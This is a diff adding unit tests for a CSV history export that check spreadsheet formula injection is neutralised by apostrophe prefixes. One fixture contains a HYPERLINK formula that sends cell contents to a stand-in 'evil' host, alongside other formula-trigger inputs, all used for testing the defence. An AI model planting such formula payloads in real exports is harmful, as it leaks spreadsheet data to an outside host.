@@ -64,6 +64,56 @@ describe("historyCsv", () => {
     expect(csv).toContain('"weird, ""quoted"" model"');
   });
 
+  it("neutralizes cells that would be read as spreadsheet formulas", () => {
+    const csv = historyCsv([
+      {
+        savedAt: "t",
+        flavor: "@SUM(1+1)",
+        modelLabel: '=HYPERLINK("http://evil/"&A2,"score")',
+      },
+    ]);
+    expect(csv).toContain(
+      '"\'=HYPERLINK(""http://evil/""&A2,""score"")"' // apostrophe-prefixed, still readable
+    );
+    expect(csv).toContain("\"'@SUM(1+1)\"");
+  });
+
+  it("neutralizes every formula trigger, including a leading tab or carriage return", () => {
+    for (const value of ["=1+1", "+1+1", "-1+1", "@A1", "\t=1+1", "\r=1+1"]) {
+      const csv = historyCsv([{ savedAt: "t", modelLabel: value }]);
+      expect(csv).toContain(`"'${value}"`);
+    }
+  });
+
+  it("leaves ordinary numbers alone, including negatives", () => {
+    const csv = historyCsv([
+      {
+        savedAt: "t",
+        avgScore: -1.5,
+        avgFaithfulness: "-2",
+        avgActionability: "+3",
+        avgClarity: "-1.5e3",
+      },
+    ]);
+    expect(csv).not.toContain("'");
+    expect(csv).toContain(",-1.5,");
+    expect(csv.trimEnd().split("\n")[1]).toContain("-2,+3,-1.5e3");
+  });
+
+  it("quotes a carriage return so a stored value cannot start a new row", () => {
+    const csv = historyCsv([
+      { savedAt: "t", modelLabel: "gemini\r=HYPERLINK(0)" },
+    ]);
+    expect(csv).toContain('"gemini\r=HYPERLINK(0)"');
+  });
+
+  it("escapes check names in the header row", () => {
+    const csv = historyCsv([
+      { savedAt: "t", checkPassRates: [{ name: 'odd, "name"', count: 1 }] },
+    ]);
+    expect(csv.split("\n")[0]).toContain('"check:odd, ""name"""');
+  });
+
   it("handles an empty history (header only)", () => {
     const csv = historyCsv([]);
     expect(csv.trimEnd().split("\n")).toHaveLength(1);
